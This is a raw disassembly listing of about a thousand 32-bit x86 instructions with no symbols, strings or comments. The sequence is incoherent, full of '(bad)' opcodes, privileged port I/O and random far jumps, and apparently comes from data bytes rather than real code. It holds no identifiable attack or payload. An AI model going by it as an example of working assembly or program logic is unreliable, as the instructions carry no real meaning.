  40d2e3:	push   edi
  40d2e4:	data16 cld 
  40d2e6:	cdq    
  40d2e7:	xor    al,0xc2
  40d2e9:	mov    ds:0x33659d6f,eax
  40d2ee:	jecxz  0x40d329
  40d2f0:	sub    edi,DWORD PTR [ebp+ecx*4+0x368214bb]
  40d2f7:	call   0x11d96ef7
  40d2fc:	and    DWORD PTR [esi+eax*2+0x34b41d],ecx
  40d303:	scas   al,BYTE PTR es:[edi]
  40d304:	add    al,0xe4
  40d306:	cs dec ecx
  40d308:	sar    ch,1
  40d30a:	out    dx,eax
  40d30b:	fdiv   st,st(4)
  40d30d:	cmp    eax,0x17359598
  40d312:	jl     0x40d37f
  40d314:	outs   dx,DWORD PTR ds:[esi]
  40d315:	inc    esi
  40d316:	mov    ah,0x6b
  40d318:	sub    bh,BYTE PTR [edx-0x5f436e23]
  40d31e:	mov    ch,0xa8
  40d320:	mov    BYTE PTR [ecx],dl
  40d322:	add    al,0x39
  40d324:	add    edi,DWORD PTR ds:[edi-0x669bb78f]
  40d32b:	lods   eax,DWORD PTR ds:[esi]
  40d32c:	repnz mov edi,0x2adac85a
  40d332:	mov    ebp,0x153d477c
  40d337:	arpl   WORD PTR [esi-0x80],bx
  40d33a:	or     ah,ch
  40d33c:	add    DWORD PTR [esi+0x11db78c2],edi
  40d342:	and    al,0xd0
  40d344:	repz or esi,ecx
  40d347:	cld    
  40d348:	push   0xffffff8d
  40d34a:	mov    ds:0xd2bd22e,al
  40d34f:	dec    ebx
  40d350:	or     DWORD PTR ds:0x30320b2e,0x515a17bb
  40d35a:	lock test DWORD PTR fs:[edx+0x10e9ed40],esp
  40d362:	sbb    al,0xc6
  40d364:	jl     0x40d3c3
  40d366:	dec    ebp
  40d367:	mov    cl,0x8
  40d369:	je     0x40d3b0
  40d36b:	call   0xe0bc:0x885c822d
  40d372:	cdq    
  40d373:	or     DWORD PTR [ecx],ecx
  40d375:	push   ds
  40d376:	pop    es
  40d377:	sub    ah,BYTE PTR [ebp-0x7d]
  40d37a:	shl    BYTE PTR [ecx+0x1c870dc6],cl
  40d380:	mov    ecx,0x27bf23b4
  40d385:	fisub  WORD PTR [ebp-0x3c246a59]
  40d38b:	adc    ecx,DWORD PTR [eax+0x31253d42]
  40d391:	sbb    eax,DWORD PTR [esp+edx*4-0x3ba92f34]
  40d398:	in     eax,dx
  40d399:	cld    
  40d39a:	cmp    BYTE PTR [ecx+0x5262ec2e],bl
  40d3a0:	in     eax,dx
  40d3a1:	iret   
  40d3a2:	push   cx
  40d3a4:	clc    
  40d3a5:	mov    al,ds:0x7e6028ff
  40d3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ab:	(bad)
  40d3ae:	leave  
  40d3af:	or     edx,ecx
  40d3b1:	add    al,0x90
  40d3b3:	sub    eax,0x5ebaf159
  40d3b8:	xor    DWORD PTR [esi+0x70],ebx
  40d3bb:	fsubr  QWORD PTR [edx+ebx*4]
  40d3be:	sar    BYTE PTR [edi-0x5f3a39bd],cl
  40d3c4:	retf   
  40d3c5:	cmp    DWORD PTR [edx+0x6e],esi
  40d3c8:	and    esp,esp
  40d3ca:	xor    DWORD PTR [edi-0x74],ebx
  40d3cd:	aad    0xcb
  40d3cf:	sbb    esi,DWORD PTR [edx+0x262e25aa]
  40d3d5:	xor    eax,0x59409cf7
  40d3da:	outs   dx,BYTE PTR ds:[esi]
  40d3db:	adc    ah,bh
  40d3dd:	mov    bh,0x47
  40d3df:	enter  0x5863,0x4a
  40d3e3:	lahf   
  40d3e4:	add    esi,DWORD PTR [edi+0x550f5042]
  40d3ea:	inc    esi
  40d3eb:	ds loope 0x40d372
  40d3ee:	sub    DWORD PTR [edx],edx
  40d3f0:	cld    
  40d3f1:	mov    eax,ds:0x46a60bb6
  40d3f6:	out    dx,eax
  40d3f7:	shl    DWORD PTR [esi-0x27e962f1],cl
  40d3fd:	jns    0x40d408
  40d3ff:	and    eax,0x228f1cc4
  40d404:	inc    ecx
  40d405:	dec    ebx
  40d406:	or     eax,0xc1fb586a
  40d40b:	aad    0x2b
  40d40d:	push   esi
  40d40e:	(bad)  
  40d410:	and    BYTE PTR [ecx],ch
  40d412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d413:	jne    0x40d461
  40d415:	mov    al,ds:0xb5383d2a
  40d41a:	pop    ebp
  40d41b:	push   esi
  40d41c:	test   al,0x23
  40d41e:	mov    ah,0xc2
  40d420:	cld    
  40d421:	adc    BYTE PTR [edx-0x3feba47c],ah
  40d427:	adc    edi,DWORD PTR [ebp+0x13942876]
  40d42d:	dec    edx
  40d42e:	leave  
  40d42f:	or     al,bl
  40d431:	lock packssdw mm2,mm0
  40d435:	mov    ecx,0x2f5cca8
  40d43a:	mov    eax,fs
  40d43c:	sbb    al,BYTE PTR [esi+0x33]
  40d43f:	adc    eax,0x20795fdd
  40d444:	mov    esp,0x588d8ef
  40d449:	out    dx,al
  40d44a:	push   0x53
  40d44c:	xchg   edx,eax
  40d44d:	ins    BYTE PTR es:[edi],dx
  40d44e:	jl     0x40d443
  40d450:	inc    ebp
  40d451:	in     al,0x71
  40d453:	adc    al,BYTE PTR [edi-0x2b0097db]
  40d459:	pusha  
  40d45a:	das    
  40d45b:	in     al,0x2c
  40d45d:	xor    dh,BYTE PTR ds:0xcedbb69c
  40d463:	lock add BYTE PTR [ebx+0x3],0xb7
  40d468:	mov    edx,0x8df0cca3
  40d46d:	sub    al,0x6d
  40d46f:	jl     0x40d4b3
  40d471:	sbb    bl,BYTE PTR [esp+edx*4]
  40d474:	adc    DWORD PTR [ebp-0x16],eax
  40d477:	push   ebp
  40d478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d479:	(bad)  
  40d47a:	adc    ebp,eax
  40d47c:	stc    
  40d47d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d480:	jle    0x40d4b4
  40d482:	cs sbb al,0xbb
  40d485:	jb     0x40d4ed
  40d487:	mov    ds:0xdde1ef54,al
  40d48c:	pop    esp
  40d48d:	hlt    
  40d48e:	mov    eax,0x8b283989
  40d493:	popf   
  40d494:	xchg   ebx,eax
  40d495:	dec    esi
  40d496:	pop    esi
  40d497:	jmp    0xb374:0xdd51de67
  40d49e:	sbb    eax,0x2a4d849c
  40d4a3:	data16 cmp bh,BYTE PTR [esi+0xfa29e0e]
  40d4aa:	push   ss
  40d4ab:	mov    dl,0xf6
  40d4ad:	push   edx
  40d4ae:	cmp    al,0x97
  40d4b0:	add    cl,BYTE PTR [ebx]
  40d4b2:	sbb    BYTE PTR [ebp+0x56cb3432],cl
  40d4b8:	push   ds
  40d4b9:	sbb    dh,bh
  40d4bb:	loope  0x40d4d2
  40d4bd:	outs   dx,DWORD PTR ds:[esi]
  40d4be:	mov    edx,0xb6a492e1
  40d4c3:	xor    al,0x66
  40d4c5:	scas   al,BYTE PTR es:[edi]
  40d4c6:	pusha  
  40d4c7:	inc    ebx
  40d4c8:	mov    edi,0x9791e37c
  40d4cd:	loop   0x40d485
  40d4cf:	retf   0xf599
  40d4d2:	in     al,dx
  40d4d3:	or     DWORD PTR [edx],edi
  40d4d5:	push   edx
  40d4d6:	inc    esp
  40d4d7:	xor    DWORD PTR ds:0xe55fbd45,esi
  40d4dd:	in     al,0x38
  40d4df:	scas   al,BYTE PTR es:[edi]
  40d4e0:	fchs   
  40d4e2:	mov    al,0x43
  40d4e4:	ja     0x40d557
  40d4e6:	imul   eax,DWORD PTR [ecx+eax*8-0x27],0xbf21f39
  40d4ee:	je     0x40d4a6
  40d4f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f1:	es cdq 
  40d4f3:	cmc    
  40d4f4:	adc    eax,0x516a5892
  40d4f9:	ins    DWORD PTR es:[edi],dx
  40d4fa:	sub    DWORD PTR [edi-0x59665cd1],ebx
  40d500:	pop    ss
  40d501:	pop    ebp
  40d502:	test   DWORD PTR [eax-0x2c30d1aa],0xd5c519e
  40d50c:	pop    edx
  40d50d:	clc    
  40d50e:	lds    ecx,FWORD PTR [edx]
  40d510:	lea    ecx,[ebx+0xc]
  40d513:	call   0x9453:0x9a070076
  40d51a:	dec    esp
  40d51b:	(bad)  
  40d51c:	pop    esi
  40d51d:	test   al,0xe
  40d51f:	cmp    ebx,edi
  40d521:	stc    
  40d522:	lods   al,BYTE PTR ds:[esi]
  40d523:	clc    
  40d524:	inc    ebp
  40d525:	xlat   BYTE PTR ds:[ebx]
  40d526:	cmp    bl,BYTE PTR [ecx+0x3b]
  40d529:	add    ecx,DWORD PTR [edi-0x5b064129]
  40d52f:	hlt    
  40d530:	jg     0x40d5a1
  40d532:	cmp    eax,DWORD PTR [ebx+0x7]
  40d535:	push   ss
  40d536:	gs ret 0x662b
  40d53a:	lods   al,BYTE PTR ds:[esi]
  40d53b:	call   0x93179c5c
  40d540:	stos   DWORD PTR es:[edi],eax
  40d541:	cmp    eax,0x72da517
  40d546:	fadd   st,st(5)
  40d548:	retf   
  40d549:	mov    cr4,edx
  40d54c:	pop    ecx
  40d54d:	mov    ch,0x84
  40d54f:	aad    0x2a
  40d551:	sbb    al,0x40
  40d553:	ss sub cl,0xca
  40d557:	imul   DWORD PTR [eax+0x22228825]
  40d55d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d55e:	call   0x69a272c5
  40d563:	icebp  
  40d564:	call   0x5339:0x82dd4957
  40d56b:	jne    0x40d5d4
  40d56d:	mov    al,cl
  40d56f:	add    BYTE PTR [ecx],ch
  40d571:	jmp    0xf0c8f2c1
  40d576:	xchg   DWORD PTR [eiz*8+0x66faed97],eax
  40d57d:	stos   BYTE PTR es:[edi],al
  40d57e:	jb     0x40d535
  40d580:	gs jl  0x40d54e
  40d583:	push   ds
  40d584:	mov    edx,0xb877240b
  40d589:	dec    esp
  40d58a:	mov    cl,ch
  40d58c:	cmp    ecx,esi
  40d58e:	stos   DWORD PTR es:[edi],eax
  40d58f:	sbb    DWORD PTR ds:0xa560332c,ebp
  40d595:	push   esi
  40d596:	mov    bh,0xcd
  40d598:	test   DWORD PTR [ebp+0xccbfc01],0x21d400ed
  40d5a2:	and    bh,BYTE PTR [esi]
  40d5a4:	ficomp WORD PTR [ecx-0x30ece60c]
  40d5aa:	sbb    bl,dh
  40d5ac:	jge    0x40d5b8
  40d5ae:	adc    BYTE PTR [esi+0x5],0x30
  40d5b2:	repz mov bh,0x1a
  40d5b5:	dec    ebx
  40d5b6:	mov    al,0x42
  40d5b8:	pop    esp
  40d5b9:	fist   WORD PTR [edi+edi*4+0x75]
  40d5bd:	ret    
  40d5be:	adc    edx,DWORD PTR [esi-0x2e51c675]
  40d5c4:	jb     0x40d5ca
  40d5c6:	inc    ecx
  40d5c7:	lahf   
  40d5c8:	xor    al,0xcd
  40d5ca:	neg    DWORD PTR [esi-0x3c]
  40d5cd:	call   0x8f44:0x4fa841d7
  40d5d4:	pop    eax
  40d5d5:	popa   
  40d5d6:	aam    0x78
  40d5d8:	std    
  40d5d9:	test   BYTE PTR [edx+eiz*8+0x7361d601],cl
  40d5e0:	mov    ah,BYTE PTR [ebx]
  40d5e2:	sbb    ebp,DWORD PTR [eax+eiz*8+0x48]
  40d5e6:	and    dh,dl
  40d5e8:	in     eax,dx
  40d5e9:	pop    ebp
  40d5ea:	ficom  WORD PTR [eax-0x6c]
  40d5ed:	xchg   BYTE PTR [esi+0x69],ch
  40d5f0:	jo     0x40d58b
  40d5f2:	sbb    al,0x58
  40d5f4:	(bad)  
  40d5f5:	mov    ch,0x98
  40d5f7:	xchg   BYTE PTR [ebx+0x3f307699],cl
  40d5fd:	fld    st(6)
  40d5ff:	jecxz  0x40d5d6
  40d601:	int    0x2e
  40d603:	jns    0x40d5c6
  40d605:	xor    eax,0x7cb86b2e
  40d60a:	mov    gs,WORD PTR [edi]
  40d60c:	xchg   esi,eax
  40d60d:	sahf   
  40d60e:	or     eax,0x95f29c7
  40d613:	pop    edx
  40d614:	push   0x17
  40d616:	ret    0x92d2
  40d619:	loopne 0x40d5d6
  40d61b:	mov    al,ds:0x4deab0d5
  40d620:	cs and dl,cl
  40d623:	xchg   edx,eax
  40d624:	pop    edx
  40d625:	mov    al,0xfb
  40d627:	addr16 dec esp
  40d629:	or     DWORD PTR [eax],edx
  40d62b:	mov    WORD PTR fs:[ecx+0x1898ef9b],fs
  40d632:	jle    0x40d5f7
  40d634:	frstor [ebx-0x57]
  40d637:	aaa    
  40d638:	stos   BYTE PTR es:[edi],al
  40d639:	mov    ch,0xd6
  40d63b:	mov    ?,WORD PTR [edx-0x6d]
  40d63e:	push   cs
  40d63f:	mov    ebp,0x1f6529f1
  40d644:	stc    
  40d645:	add    eax,0xd14ac0c
  40d64a:	push   cs
  40d64b:	sbb    al,0x73
  40d64d:	pop    ds
  40d64e:	mov    cl,0xa5
  40d650:	and    ch,BYTE PTR [ebp-0x3]
  40d653:	lods   al,BYTE PTR ds:[esi]
  40d654:	dec    edx
  40d655:	mov    bh,0x7
  40d657:	jmp    0x40d6ca
  40d659:	rcl    esp,cl
  40d65b:	and    eax,0x305c1c4f
  40d660:	es mov dl,0x87
  40d663:	xor    bh,bl
  40d665:	call   0xc285:0x14eba4d7
  40d66c:	(bad)  
  40d66d:	cwde   
  40d66e:	push   ebx
  40d66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d671:	dec    esp
  40d672:	ret    0xe24c
  40d675:	ret    0xb3de
  40d678:	(bad)  
  40d679:	cmp    BYTE PTR [edi],dl
  40d67b:	stos   DWORD PTR es:[edi],eax
  40d67c:	pop    esp
  40d67d:	or     ebp,ebp
  40d67f:	outs   dx,BYTE PTR ds:[esi]
  40d680:	pop    edi
  40d681:	sbb    al,0xa8
  40d683:	int3   
  40d684:	pusha  
  40d685:	cmc    
  40d686:	pop    esp
  40d687:	fs iret 
  40d689:	push   ds
  40d68a:	ins    BYTE PTR es:[edi],dx
  40d68b:	inc    edx
  40d68c:	sub    DWORD PTR [esi-0x6929a226],0x38aa6b03
  40d696:	cld    
  40d697:	mov    dh,0xcf
  40d699:	es pop ecx
  40d69b:	and    BYTE PTR [ebp+0x48],bh
  40d69e:	pushf  
  40d69f:	adc    DWORD PTR [ecx+0x2b],ebp
  40d6a2:	add    DWORD PTR [ecx],esi
  40d6a4:	call   FWORD PTR [edi-0x26f929bd]
  40d6aa:	or     dh,ch
  40d6ac:	pop    esp
  40d6ad:	jmp    0x51f23e6a
  40d6b2:	inc    edx
  40d6b3:	inc    esp
  40d6b4:	jmp    0x1e82:0x44e65b6b
  40d6bb:	xchg   ebx,eax
  40d6bc:	xchg   esp,eax
  40d6be:	nop
  40d6bf:	lea    ebp,[esi+0x1a9be5d]
  40d6c5:	xor    dl,BYTE PTR [esi+0x16]
  40d6c8:	std    
  40d6c9:	pop    edi
  40d6ca:	xchg   esi,ebx
  40d6cc:	mov    edx,0x926b7969
  40d6d1:	cmp    eax,0xb64a69d6
  40d6d6:	mov    WORD PTR [ebx+0x78],?
  40d6d9:	fist   DWORD PTR [edi-0x60625330]
  40d6df:	fild   DWORD PTR [ebx-0xa]
  40d6e2:	cmp    ecx,eax
  40d6e4:	sub    DWORD PTR [ebp+0x6a],ebx
  40d6e7:	fld    st(6)
  40d6e9:	and    edi,ebx
  40d6eb:	jbe    0x40d745
  40d6ed:	cwde   
  40d6ee:	pusha  
  40d6ef:	xor    ebx,edx
  40d6f1:	into   
  40d6f2:	iret   
  40d6f3:	fimul  WORD PTR [ebp+0x33]
  40d6f6:	outs   dx,BYTE PTR ds:[esi]
  40d6f7:	pop    esi
  40d6f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6f9:	and    BYTE PTR [ecx],cl
  40d6fb:	jp     0x40d6e0
  40d6fd:	add    eax,0x70dca9bd
  40d702:	add    eax,0xd48446c9
  40d707:	push   0xffffffa4
  40d709:	or     eax,0x9bd0b03e
  40d70e:	jmp    0x6e4d1027
  40d713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d714:	leave  
  40d715:	test   BYTE PTR [ecx-0xf],cl
  40d718:	push   edi
  40d719:	retf   
  40d71a:	pop    ebp
  40d71b:	inc    eax
  40d71c:	in     eax,0x7b
  40d71e:	xchg   esi,eax
  40d71f:	xor    ecx,DWORD PTR [eax]
  40d721:	lea    ebx,[esi+ebx*2+0x6c]
  40d725:	fidiv  WORD PTR [edx]
  40d727:	loop   0x40d72a
  40d729:	loop   0x40d702
  40d72b:	and    al,0xc4
  40d72d:	mov    edx,0x3967b773
  40d732:	aas    
  40d733:	and    BYTE PTR [edx],cl
  40d735:	fstp   QWORD PTR [eax+ebx*2+0x6285fb34]
  40d73c:	scas   eax,DWORD PTR es:[edi]
  40d73d:	inc    esi
  40d73e:	mov    BYTE PTR [ebx-0x3499e029],bh
  40d744:	add    BYTE PTR [edx+0x42],ah
  40d747:	jno    0x40d730
  40d749:	retf   
  40d74a:	arpl   sp,si
  40d74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d74d:	mov    fs,WORD PTR [esi+0x32]
  40d750:	cmp    esi,DWORD PTR [ebp+0x4c]
  40d753:	push   edx
  40d754:	and    eax,0x487c952b
  40d759:	jne    0x40d706
  40d75b:	add    BYTE PTR [ebp+0x11061c4f],dl
  40d761:	cmp    al,0xd1
  40d763:	xchg   edx,eax
  40d764:	dec    ebp
  40d765:	push   edi
  40d766:	pop    edi
  40d767:	xlat   BYTE PTR ds:[ebx]
  40d768:	cli    
  40d769:	add    DWORD PTR [eax],0xffffffae
  40d76c:	and    dl,BYTE PTR [edi+0x4cefe168]
  40d772:	in     eax,0xc3
  40d774:	or     cl,BYTE PTR [ebx]
  40d776:	stos   DWORD PTR es:[edi],eax
  40d777:	and    BYTE PTR ds:0xca269006,ah
  40d77d:	push   0xffffffb4
  40d77f:	pop    esi
  40d780:	sahf   
  40d781:	je     0x40d711
  40d783:	sbb    DWORD PTR [ebp+0x29],ecx
  40d786:	data16 jno 0x40d800
  40d789:	jmp    0x40d733
  40d78b:	(bad)  
  40d78d:	popa   
  40d78e:	push   esp
  40d790:	in     al,dx
  40d791:	inc    edi
  40d792:	loope  0x40d76b
  40d794:	js     0x40d7b4
  40d796:	out    0x89,al
  40d798:	jg     0x40d730
  40d79a:	aad    0x52
  40d79c:	dec    ecx
  40d79d:	pop    ebx
  40d79e:	sbb    DWORD PTR [esi],ebx
  40d7a0:	ror    DWORD PTR [edx-0x24e5bc36],cl
  40d7a6:	scas   al,BYTE PTR es:[edi]
  40d7a7:	fsubr  QWORD PTR [ebx+eax*2]
  40d7aa:	fld    st(7)
  40d7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ad:	and    al,0x4c
  40d7af:	(bad)
  40d7b2:	pushf  
  40d7b3:	dec    edi
  40d7b4:	ins    DWORD PTR es:[edi],dx
  40d7b5:	clc    
  40d7b6:	mov    cl,BYTE PTR [edx-0x2db5ea95]
  40d7bc:	fistp  QWORD PTR [ebx-0x4]
  40d7bf:	push   eax
  40d7c0:	icebp  
  40d7c1:	sar    BYTE PTR [ebp+0x77],cl
  40d7c4:	(bad)  
  40d7c5:	in     al,dx
  40d7c6:	les    ebp,FWORD PTR [edx]
  40d7c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7c9:	hlt    
  40d7ca:	pop    ebp
  40d7cb:	enter  0x16b9,0x7c
  40d7cf:	stos   DWORD PTR es:[edi],eax
  40d7d0:	fsub   DWORD PTR [esi+ebx*4-0x4ae37a7b]
  40d7d7:	addr16 in eax,0x54
  40d7da:	inc    ebx
  40d7db:	push   edi
  40d7dc:	loope  0x40d7ad
  40d7de:	mov    eax,DWORD PTR [eax+ecx*4]
  40d7e1:	cwde   
  40d7e2:	mov    cl,0xbc
  40d7e4:	leave  
  40d7e5:	das    
  40d7e6:	cmp    BYTE PTR ds:0x95ff10c4,al
  40d7ec:	dec    ebx
  40d7ed:	mov    ebp,0x4c1771b1
  40d7f2:	lds    ebx,FWORD PTR [esi+eiz*2-0x2a]
  40d7f6:	test   BYTE PTR [edx-0x7835e759],0x55
  40d7fd:	daa    
  40d7fe:	xchg   edi,eax
  40d7ff:	sbb    BYTE PTR [ecx+0x65],0xbb
  40d803:	xchg   BYTE PTR [ebp-0x54],cl
  40d806:	mov    BYTE PTR [ebx+ebx*8+0x6b],ah
  40d80a:	xchg   BYTE PTR [ebx-0x73],ch
  40d80d:	enter  0x9610,0xa8
  40d811:	dec    ecx
  40d812:	mov    ds:0xfcec6676,al
  40d817:	and    ebp,DWORD PTR [ebp+ebp*8+0x29bb527d]
  40d81e:	jae    0x40d89b
  40d820:	mov    al,ds:0x43e1f596
  40d825:	or     BYTE PTR [esi-0x78],bl
  40d828:	dec    eax
  40d829:	pop    ebx
  40d82a:	(bad)  [ebp+0x78261647]
  40d830:	xor    eax,0x2e435566
  40d835:	test   DWORD PTR [ecx+eiz*4+0x3a10c3e2],0xb4169f83
  40d840:	cli    
  40d841:	int3   
  40d842:	js     0x40d892
  40d844:	test   BYTE PTR [esp+esi*8],dh
  40d847:	pop    esi
  40d848:	pop    es
  40d849:	popf   
  40d84a:	xchg   edi,eax
  40d84b:	(bad)
  40d850:	jo     0x40d860
  40d852:	add    DWORD PTR [ecx],0xe28a3e62
  40d858:	les    eax,FWORD PTR [edi]
  40d85a:	jmp    0x4716:0xb6891070
  40d861:	cmp    bh,BYTE PTR [ebp-0x70]
  40d864:	out    dx,al
  40d865:	mov    ebp,ss
  40d867:	ficomp WORD PTR [esi+ebp*1-0x5d]
  40d86b:	in     eax,0x52
  40d86d:	test   al,0x2d
  40d86f:	lods   eax,DWORD PTR ds:[esi]
  40d870:	jae    0x40d8dd
  40d872:	inc    ebx
  40d873:	xor    bh,bh
  40d875:	xor    eax,0x514250f4
  40d87a:	lods   eax,DWORD PTR ds:[esi]
  40d87b:	fcom   QWORD PTR [edi+0x3b]
  40d87e:	mov    dh,0x13
  40d880:	mov    ecx,0x2f06fa35
  40d885:	sub    BYTE PTR [ebp-0x5],dh
  40d888:	pop    ss
  40d889:	jmp    0xe4ba2948
  40d88e:	lds    esp,FWORD PTR [edi-0x3f]
  40d891:	jle    0x40d8f3
  40d893:	repz mov edi,0x279e2818
  40d899:	jmp    0x40d835
  40d89b:	(bad)  
  40d89c:	ja     0x40d8c6
  40d89e:	daa    
  40d89f:	or     DWORD PTR [eax-0x22092d8b],edi
  40d8a5:	mov    ecx,0x1e683515
  40d8aa:	mov    bh,BYTE PTR [ecx+0x0]
  40d8ad:	in     al,0x1f
  40d8af:	push   edi
  40d8b0:	mov    bl,0xdf
  40d8b2:	leave  
  40d8b3:	push   ss
  40d8b4:	call   0x828c:0x729e0418
  40d8bb:	cmp    DWORD PTR [ecx-0x2],0xffffffb0
  40d8bf:	push   edx
  40d8c0:	inc    eax
  40d8c1:	js     0x40d8a2
  40d8c3:	js     0x40d923
  40d8c5:	xor    eax,0x9992390
  40d8ca:	ins    BYTE PTR es:[edi],dx
  40d8cb:	sti    
  40d8cc:	mov    esi,0xe3af83d0
  40d8d1:	cmp    DWORD PTR [edx+0x7],eax
  40d8d4:	dec    eax
  40d8d5:	push   0xed8de4e4
  40d8da:	retf   0x4c2f
  40d8dd:	enter  0x9ee8,0x86
  40d8e1:	aaa    
  40d8e2:	sbb    al,0xfe
  40d8e4:	push   ds
  40d8e5:	sar    DWORD PTR [esi-0x739b0405],1
  40d8eb:	scas   al,BYTE PTR es:[edi]
  40d8ec:	cli    
  40d8ed:	sub    DWORD PTR [ebx+0x7d],0x79190302
  40d8f4:	fstp   QWORD PTR [edx+0x58a7475e]
  40d8fa:	jmp    0xcdb3:0xd00dbba3
  40d901:	aas    
  40d902:	sub    BYTE PTR [edi-0x70],ch
  40d905:	div    DWORD PTR [ebp-0x28]
  40d908:	jp     0x40d8eb
  40d90a:	je     0x40d8a5
  40d90c:	lahf   
  40d90d:	std    
  40d90e:	pop    esp
  40d90f:	fldenv [edx+0x39]
  40d912:	add    DWORD PTR [edi-0x69],edx
  40d915:	sti    
  40d916:	push   ss
  40d917:	push   esi
  40d918:	js     0x40d996
  40d91a:	adc    esp,DWORD PTR [ebx-0x40449b8b]
  40d920:	or     DWORD PTR [ebx-0xd87b69f],0x43e94d49
  40d92a:	cmp    al,0xe6
  40d92c:	mov    ah,0x8d
  40d92e:	je     0x40d981
  40d930:	dec    esp
  40d931:	(bad)  
  40d933:	jg     0x40d8f7
  40d935:	sbb    DWORD PTR [eax-0x71],0x4a
  40d939:	push   esp
  40d93a:	mov    ecx,0xc850514e
  40d93f:	test   al,0x8f
  40d941:	nop
  40d942:	dec    ebp
  40d943:	les    ebp,FWORD PTR [edi+0x4]
  40d946:	aam    0xee
  40d948:	stc    
  40d949:	cmp    BYTE PTR [eax+edx*4+0x7f08879],dl
  40d950:	aas    
  40d951:	inc    esi
  40d952:	xor    DWORD PTR [ebx+0x23a23ae3],eax
  40d958:	jecxz  0x40d8df
  40d95a:	or     dl,BYTE PTR [ecx+ebp*8-0x60]
  40d95e:	jmp    edx
  40d960:	xchg   ebp,eax
  40d961:	dec    eax
  40d962:	sub    eax,0x6b
  40d965:	inc    edi
  40d966:	fwait
  40d967:	dec    esi
  40d968:	and    ah,BYTE PTR [ebx+0x24]
  40d96b:	or     bh,BYTE PTR [ebx+0x68f13a89]
  40d971:	outs   dx,BYTE PTR ds:[esi]
  40d972:	dec    ebx
  40d973:	test   BYTE PTR [edi+edi*1],0x8b
  40d977:	cli    
  40d978:	(bad)  
  40d979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d97a:	sub    eax,0xb9890775
  40d97f:	ins    BYTE PTR es:[edi],dx
  40d980:	mov    cl,0x90
  40d982:	inc    edi
  40d983:	xchg   ecx,eax
  40d984:	inc    ebx
  40d985:	inc    eax
  40d986:	imul   esp,DWORD PTR [edx],0x144def30
  40d98c:	iret   
  40d98d:	inc    ebx
  40d98e:	(bad)
  40d991:	xor    esi,DWORD PTR [eax]
  40d993:	fist   DWORD PTR [ecx-0x3]
  40d996:	cwde   
  40d997:	push   ebx
  40d998:	in     al,0x23
  40d99a:	gs and eax,0x784c1ee1
  40d9a0:	and    eax,DWORD PTR [ebp+0xc]
  40d9a3:	jo     0x40d960
  40d9a5:	and    DWORD PTR [ecx-0x10a6c996],esi
  40d9ab:	(bad)  
  40d9ad:	aam    0xac
  40d9af:	inc    ebp
  40d9b0:	add    BYTE PTR ds:0xdd090846,cl
  40d9b6:	adc    BYTE PTR [ebx-0x30d7b179],dh
  40d9bc:	adc    BYTE PTR [esi+0xfe6455a],al
  40d9c2:	outs   dx,BYTE PTR ds:[esi]
  40d9c3:	inc    eax
  40d9c4:	jae    0x40d95c
  40d9c6:	fwait
  40d9c7:	jl     0x40d9ff
  40d9c9:	push   es
  40d9ca:	jnp    0x40d9a4
  40d9cc:	icebp  
  40d9cd:	push   edx
  40d9ce:	or     bl,bl
  40d9d0:	scas   eax,DWORD PTR es:[edi]
  40d9d1:	cmc    
  40d9d2:	mov    dl,0x3f
  40d9d4:	jmp    0xaf928c95
  40d9d9:	dec    esp
  40d9da:	pusha  
  40d9db:	jno    0x40d9cb
  40d9dd:	dec    esi
  40d9de:	dec    edx
  40d9df:	mov    DWORD PTR [edi+edx*1+0x38],eax
  40d9e3:	cmp    BYTE PTR [esi-0x34fad920],dl
  40d9e9:	xor    ebx,DWORD PTR [ecx+esi*2]
  40d9ec:	push   ss
  40d9ed:	fldcw  WORD PTR [ecx+0x6a]
  40d9f0:	xchg   bh,ch
  40d9f2:	fistp  DWORD PTR [esi-0x2f]
  40d9f5:	jbe    0x40da01
  40d9f7:	sub    DWORD PTR [edx-0x3f3855f8],eax
  40d9fd:	nop
  40d9fe:	inc    edi
  40d9ff:	ss jmp 0x7c39fc0
  40da05:	retf   
  40da06:	(bad)  [edi-0x67]
  40da09:	outs   dx,DWORD PTR ds:[esi]
  40da0a:	lea    esi,[ebp-0x1a]
  40da0d:	xchg   esp,eax
  40da0e:	and    al,0x93
  40da10:	adc    eax,0xf751be60
  40da15:	in     eax,dx
  40da16:	repnz mov bl,0x16
  40da19:	popf   
  40da1a:	hlt    
  40da1b:	adc    BYTE PTR [edx+ebp*2+0x21475a4f],dh
  40da22:	and    al,0x1a
  40da24:	addr16 cmp dh,ch
  40da27:	mov    esi,0x63a6d41a
  40da2c:	adc    eax,0xcafabac3
  40da31:	sbb    al,0xa4
  40da33:	into   
  40da34:	cdq    
  40da35:	or     edx,DWORD PTR [ecx]
  40da37:	xchg   BYTE PTR [edi+0x37],cl
  40da3a:	dec    eax
  40da3b:	or     al,0x21
  40da3d:	fcmovne st,st(4)
  40da3f:	cli    
  40da40:	mov    eax,ds:0xd1738afe
  40da45:	xchg   esi,eax
  40da46:	shr    eax,1
  40da48:	and    eax,DWORD PTR [edx+0x27]
  40da4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da4c:	cmp    dl,BYTE PTR [esi+ecx*1-0x71]
  40da50:	fldenv [edx+0x1e]
  40da53:	dec    ecx
  40da54:	in     eax,0x0
  40da56:	(bad)  
  40da57:	ret    0x849e
  40da5a:	xchg   ebp,eax
  40da5b:	mov    esp,0xe2d6665f
  40da60:	cmp    DWORD PTR [edi],0xffffffa7
  40da63:	lods   eax,DWORD PTR ds:[esi]
  40da64:	jbe    0x40dabc
  40da66:	ds push cs
  40da68:	add    DWORD PTR [ebp-0x55fdbb45],0x90afd8b8
  40da72:	daa    
  40da73:	dec    edx
  40da74:	cs inc ecx
  40da76:	pop    eax
